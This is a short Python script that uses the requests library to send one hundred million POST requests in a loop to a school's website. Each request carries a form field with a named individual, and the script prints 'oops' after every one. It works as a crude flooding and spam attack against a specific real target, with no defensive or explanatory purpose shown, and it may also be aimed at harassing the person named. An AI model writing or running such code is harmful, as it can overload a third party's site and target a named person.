import requests 

for x in range(100000000): 
  requests.post('https://www.wirralgrammarboys.com/', data={'name': 'Christian Harris'}) 
  print("oops") 
